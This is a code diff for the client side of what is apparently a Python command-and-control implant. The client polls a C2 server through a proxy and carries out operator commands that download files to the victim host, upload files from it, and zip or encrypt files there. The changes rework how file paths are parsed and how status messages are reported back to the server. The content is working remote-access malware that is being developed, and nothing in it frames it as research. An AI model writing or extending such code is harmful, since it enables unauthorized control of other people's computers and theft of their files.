@@ -19,7 +19,7 @@ from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
-                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD)
+                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, STORAGE)
 
 # If Client have Windows OS
 if system() == "Windows":
@@ -60,12 +60,9 @@ def post_to_server(message: str, response_path=RESPONSE):
 """this is a function that split string and returns third item.
 by default, all forwarded slashes in the third item Changed to backslashes
 this can be disabled, if replace set on False during call function. """
-def get_third_item(input_string, replace=True):
+def get_filename(input_string):
     try:
-        if replace:
-            return input_string.split()[2].replace("\\", "/")
-        else:
-            return input_string.split()[2]
+        return " ".join(input_string.split()[2:]).replace("\\","/")
     # If the path of the file doesn't enter correctly, notify us on the server
     except IndexError:
         post_to_server(f"You must enter Argument after {input_string}. \n")
@@ -138,7 +135,7 @@ while True:
     # Actually Client download from our C2 server, in below elif block Handle the download command
     elif command.startswith("client download"):
         # Split out the filepath to download, and replace \ with /
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
 
         # If we got IndexError, start a new iteration of the wile loop
         if filepath is None:
@@ -163,7 +160,7 @@ while True:
                         fileHandle.write(cipher.decrypt(response.content))
 
                     # Notify us on the server that the file was downloaded
-                    post_to_server(f"{filename} is now Written in {filepath} on {client}.\n")
+                    post_to_server(f"\n[+] Client: {filename} is now Written in {filepath} on {client}.\n")
 
         # Exception Handling Common Errors maybe occurs
         except FileNotFoundError:
@@ -180,7 +177,7 @@ while True:
     elif command.startswith("client upload"):
 
         # Split out the filepath to download, and replace \ with /
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
 
         # If we got IndexError, start a new iteration of the wile loop
         if filepath is None:
@@ -200,7 +197,7 @@ while True:
                     headers=HEADERS, proxies=PROXY)
 
             # Notify us on the server that the file was downloaded
-            post_to_server(f"{filename} is now Uploaded to the {client}.\n")
+            post_to_server(f"[+] Client: {filename} is now Uploaded to {STORAGE}/{filename} on the {client}.\n")
 
         # Exception Handling Common Errors maybe occurs
         except FileNotFoundError:
@@ -212,7 +209,7 @@ while True:
 
     elif command.startswith("client zip"):
         # Split out the filepath to download, and replace \ with /
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
 
         # If we got IndexError, start a new iteration of the wile loop
         if filepath is None:
@@ -244,7 +241,7 @@ while True:
     # the 'client unzip FILE' command allows us to Unzip-Decrypt files on the client
     elif command.startswith("client unzip"):
         # Split out the filepath to download, and replace \ with /
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
 
         # If we got IndexError, start a new iteration of the wile loop
         if filepath is None:
